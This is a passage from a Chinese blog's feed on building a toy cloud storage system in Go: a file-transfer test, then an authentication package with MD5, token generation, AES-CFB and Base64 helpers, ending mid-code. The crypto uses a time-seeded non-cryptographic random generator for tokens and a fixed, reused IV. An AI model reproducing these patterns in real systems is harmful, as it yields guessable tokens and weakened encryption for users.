&lt;h2 id=&quot;测试&quot;&gt;&lt;a href=&quot;#测试&quot; class=&quot;headerlink&quot; title=&quot;测试&quot;&gt;&lt;/a&gt;测试&lt;/h2&gt;&lt;p&gt;在 &lt;code&gt;transmit&lt;/code&gt; 目录下放置一个名为 &lt;code&gt;test_in.exe&lt;/code&gt; 的文件用于测试传输，这里我放置了一个 293M 的 Idea 安装包（已重命名为 &lt;code&gt;test_in.exe&lt;/code&gt;）作为测试文件。&lt;br&gt;&lt;img src=&quot;http://7xktmz.com1.z0.glb.clouddn.com/test_in_file_.jpg&quot; width=&quot;400px&quot;&gt;&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;transmit&lt;/code&gt; 目录下启动终端，执行 &lt;code&gt;go test&lt;/code&gt;，输出结果为 &lt;code&gt;OK, pass&lt;/code&gt; 表明测试成功，此时 &lt;code&gt;transmit&lt;/code&gt; 目录下还会出现 &lt;code&gt;test_out.exe&lt;/code&gt;， 该文件内容和之前放置的 &lt;code&gt;test_in.exe&lt;/code&gt; 相同。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;专栏目录：&lt;a href=&quot;http://blog.forec.cn/columns/cloud-storage.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;云存储系统从入门到放弃&lt;/a&gt;&lt;br&gt;此专栏的上一篇文章：&lt;a href=&quot;http://blog.forec.cn/2016/11/14/cloud-storage-system-3/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;简易云存储系统认证基础模块实现&lt;/a&gt;&lt;br&gt;此专栏的下一篇文章：&lt;a href=&quot;http://blog.forec.cn/2016/11/19/cloud-storage-system-5&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;简易云存储系统数据用户设计&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章&lt;a href=&quot;http://blog.forec.cn/2016/11/16/cloud-storage-system-4/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原始出处&lt;/a&gt;(&lt;a href=&quot;http://blog.forec.cn/2016/11/16/cloud-storage-system-4/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.forec.cn/2016/11/16/cloud-storage-system-4/&lt;/a&gt;) 、作者信息（&lt;a href=&quot;http://forec.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Forec&lt;/a&gt;）和本声明。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;编写传输和认证模块的单元测试。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Code" scheme="http://forec.github.io/categories/Code/"/>
    
    
      <category term="Golang" scheme="http://forec.github.io/tags/Golang/"/>
    
      <category term="云存储" scheme="http://forec.github.io/tags/%E4%BA%91%E5%AD%98%E5%82%A8/"/>
    
      <category term="线程" scheme="http://forec.github.io/tags/%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>简易云存储系统认证基础模块实现</title>
    <link href="http://forec.github.io/2016/11/15/cloud-storage-system-3/"/>
    <id>http://forec.github.io/2016/11/15/cloud-storage-system-3/</id>
    <published>2016-11-15T05:09:47.000Z</published>
    <updated>2016-11-19T14:35:47.650Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;p&gt;使用 Golang 实现&lt;a href=&quot;http://blog.forec.cn/2016/11/13/cloud-storage-system-1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;此前&lt;/a&gt;设计的云存储系统传输、认证协议所需的基础模块。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;实现-authenticate-包&quot;&gt;&lt;a href=&quot;#实现-authenticate-包&quot; class=&quot;headerlink&quot; title=&quot;实现 authenticate 包&quot;&gt;&lt;/a&gt;实现 authenticate 包&lt;/h1&gt;&lt;p&gt;根据&lt;a href=&quot;http://blog.forec.cn/2016/11/12/cloud-storage-system-0/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;项目介绍&lt;/a&gt;中提出的需求，authenticate 包中应当提供函数实现以下功能：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;计算文件块的 MD5 值&lt;/li&gt;
&lt;li&gt;随机生成用于加密的 token，且可根据安全等级决定 token 长度&lt;/li&gt;
&lt;li&gt;基本的 AES CFB 加/解密接口&lt;/li&gt;
&lt;li&gt;基本的 Base64 编/解码接口&lt;/li&gt;
&lt;li&gt;int64 和字节流转换&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在工程目录下新建文件夹 &lt;code&gt;authenticate&lt;/code&gt; ，在该目录下新建代码 &lt;code&gt;authenticate.go&lt;/code&gt; ，以下将逐个实现上述功能。&lt;/p&gt;
&lt;h2 id=&quot;MD5-值计算&quot;&gt;&lt;a href=&quot;#MD5-值计算&quot; class=&quot;headerlink&quot; title=&quot;MD5 值计算&quot;&gt;&lt;/a&gt;MD5 值计算&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Golang 的 &lt;code&gt;crypto&lt;/code&gt; 包提供了一个 md5 计算方法，可以直接调用并包装。函数 &lt;code&gt;MD5(string) []byte&lt;/code&gt; 接收一个字符串并返回该字符串计算出的 MD5 字节流：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// authenticate.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;crypto/md5&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;encoding/hex&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; MD5(text &lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt;) []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ctx := md5.New()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ctx.Write([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(text))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(hex.EncodeToString(ctx.Sum(&lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Token-生成&quot;&gt;&lt;a href=&quot;#Token-生成&quot; class=&quot;headerlink&quot; title=&quot;Token 生成&quot;&gt;&lt;/a&gt;Token 生成&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;token 的生成方式可以随意选择，这里计算一个随机字符串的 MD5 值作为 token。函数 &lt;code&gt;GenerateToken(level uint8)[]byte&lt;/code&gt; 接收一个 uint8 类型的参数 &lt;code&gt;level&lt;/code&gt;，该参数指定生成 token 的等级，当 &lt;code&gt;level&lt;/code&gt; 为 1 或更低时，生成 16 字节的 token；当 &lt;code&gt;level&lt;/code&gt; 为 2 时，生成 24 字节的 token；否则生成 32 字节。&lt;code&gt;GetRandomString(int) string&lt;/code&gt; 接收一个正整数，生成参数指定长度的随机字串。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// authenticate.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;math/rand&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;time&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; GenerateToken(level &lt;span class=&quot;typename&quot;&gt;uint8&lt;/span&gt;) []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; level &amp;lt;= &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &amp;#123; &lt;span class=&quot;comment&quot;&gt;// 128 bits, 16 bits token&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; MD5(GetRandomString(&lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;))[:&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; level == &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &amp;#123; &lt;span class=&quot;comment&quot;&gt;// 192 bits, 24 bits token&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; MD5(GetRandomString(&lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;))[:&lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123; &lt;span class=&quot;comment&quot;&gt;// 256 bits, 32 bits token&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; MD5(GetRandomString(&lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;))[:&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; GetRandomString(leng &lt;span class=&quot;typename&quot;&gt;int&lt;/span&gt;) &lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	str := &lt;span class=&quot;string&quot;&gt;&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	bytes := []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(str)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	result := []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	r := rand.New(rand.NewSource(time.Now().UnixNano()))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i := &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; leng; i++ &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		result = &lt;span class=&quot;built_in&quot;&gt;append&lt;/span&gt;(result, bytes[r.Intn(&lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(bytes))])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt;(result)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;AES-CFB-模块创建&quot;&gt;&lt;a href=&quot;#AES-CFB-模块创建&quot; class=&quot;headerlink&quot; title=&quot;AES CFB 模块创建&quot;&gt;&lt;/a&gt;AES CFB 模块创建&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Golang 的 &lt;code&gt;crypto&lt;/code&gt; 包提供了 aes 模块和 cipher 模块，&lt;code&gt;aes.NewCipher(key)&lt;/code&gt; 将根据 key 生成一个新的 AES 模块。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// authenticate.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;crypto/aes&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;crypto/cipher&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; NewAesBlock(key []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;) cipher.Block &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	block, err := aes.NewCipher(key)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; block&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;我们使用 cipher.Block 的 CFB 加密模块，&lt;code&gt;commonIV&lt;/code&gt; 是 CFB 模式（密码反馈模式）的唯一 IV，和密钥一起作用于加密器，这里取 0~15。函数 &lt;code&gt;AesEncode([]byte, cipher.Block)[]byte&lt;/code&gt; 接收一段明文字节流和加密模块，并返回加密后的字节流。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// authenticate.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; commonIV = []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;&amp;#123;&lt;span class=&quot;number&quot;&gt;0x00&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x01&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x02&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x03&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x04&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x05&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x06&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x07&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x08&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x09&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x0a&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x0b&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x0c&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x0d&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x0e&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x0f&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; AesEncode(plaintext []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;, block cipher.Block) []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	cfb := cipher.NewCFBEncrypter(block, commonIV)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ciphertext := &lt;span class=&quot;built_in&quot;&gt;make&lt;/span&gt;([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(plaintext))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	cfb.XORKeyStream(ciphertext, plaintext)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(ciphertext)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;解密过程和加密类似，但需要事先获知明文长度。函数 &lt;code&gt;AesDecode([]byte, int64, cipher.Block)([]byte, error)&lt;/code&gt; 接收密文、明文长度和 AES 模块，如果解密成功则返回明文字节流，否则返回信息中携带错误：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// authenticate.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; AesDecode(cipherText []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;, plainLen &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;, block cipher.Block) ([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;, error) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	cfbdec := cipher.NewCFBDecrypter(block, commonIV)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	plaintext := &lt;span class=&quot;built_in&quot;&gt;make&lt;/span&gt;([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;, plainLen)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	cfbdec.XORKeyStream(plaintext, cipherText)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(plaintext), &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Base64-编-解码&quot;&gt;&lt;a href=&quot;#Base64-编-解码&quot; class=&quot;headerlink&quot; title=&quot;Base64 编/解码&quot;&gt;&lt;/a&gt;Base64 编/解码&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Golang 的 &lt;code&gt;crypto&lt;/code&gt; 包提供了可使用的 Base64 编/解码工具，只需要简单将其封装。我们在 &lt;code&gt;authenticate.go&lt;/code&gt; 中为其声明一个编码类的实例，将所有编/解码请求委托给该实例。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// authenticate.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;encoding/base64&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	base64Table = &lt;span 